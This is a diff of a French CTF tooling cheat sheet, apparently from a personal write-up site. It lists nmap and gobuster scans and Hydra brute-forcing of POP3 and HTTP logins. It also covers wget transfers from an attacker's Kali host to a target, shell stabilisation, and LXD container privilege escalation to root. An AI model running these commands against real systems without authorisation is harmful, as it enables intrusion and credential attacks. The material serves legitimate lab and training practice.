@@ -4,13 +4,13 @@ description: Outils utilisés dans la résolution des challenges.
 
 # Outils
 
-## nmap
+## 1. nmap
 
 ```shell-session
 nmap $IP -A -p- -oN nmap.txt -T4
 ```
 
-## gobuster
+## 2. gobuster
 
 ```shell-session
 gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x ".php,.html,.txt,.zip" -u $IP -t50
@@ -22,7 +22,7 @@ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x 
 
 
 
-## Hydra
+## 3. Hydra
 
 * Hydra pour pop3
 
@@ -42,7 +42,7 @@ hydra -l <user>  -P /usr/share/wordlists/fasttrack.txt pop3://$IP -s <port> -t 6
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt $IP -s <port> http-get
 ```
 
-## Transfert de fichiers
+## 4. Transfert de fichiers
 
 Pour transférer des fichiers depuis la machine Kali vers la machine cible:
 
@@ -54,7 +54,7 @@ Pour transférer des fichiers depuis la machine Kali vers la machine cible:
    2. `wget < kali tun0 IP>:8000/fichier.à.transférer`
    3. rendre les fichiers exécutables avec `chmod +x`
 
-## Privilege Escalation
+## 5. Privilege Escalation
 
 Voici la méthode générique que j'utilise pour trouver les possibilités de 'privilege escalation'. Cette méthode est en partie basée sur l'article Linux [Privilege Escalation: Automated Script](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/).
 
@@ -63,7 +63,7 @@ Voici la méthode générique que j'utilise pour trouver les possibilités de 'p
 3. [les.sh](https://github.com/The-Z-Labs/linux-exploit-suggester)
 4. [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
 
-## Consolidation d'un Shell
+## 6. Consolidation d'un Shell
 
 ```shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -73,7 +73,7 @@ export TERM=xterm
 (stty cols 132 rows 34)
 ```
 
-## Escalade de privilèges via LXD
+## 7. Escalade de privilèges via LXD
 
 Basé sur cet article: [LXC/LXD (Linux Container/Daemon) Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/container/lxc-lxd-privilege-escalation/)
 
@@ -84,7 +84,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
 ```
 
-### Sur la machine Kali
+### 7.1 Sur la machine Kali
 
 Préparez un conteneur linux et lancer un serveur http
 
@@ -95,7 +95,7 @@ sudo ./build-alpine
 python3 -m http.server 8000
 ```
 
-### Sur la machine cible
+### 7.2 Sur la machine cible
 
 Téléchargez le fichier \<alpine tar.gz> et importez-le comme image dans LXC
 
@@ -148,3 +148,11 @@ Rendez-vous dans le répertoire principal de la machine cible monté en /mnt/roo
 cd /mnt/root
 
 ```
+
+### 8. Outils Stéganographie
+
+Voici un lien vers une liste d'outils de stéganographie que j'utilise souvent
+
+[https://medium.com/@ria.banerjee005/steganography-tools-techniques-bba3f95c7148](https://medium.com/@ria.banerjee005/steganography-tools-techniques-bba3f95c7148)
+
+On y retrouve notamment **strings**, **steghide**, **stegseek** et autres **exiftools**
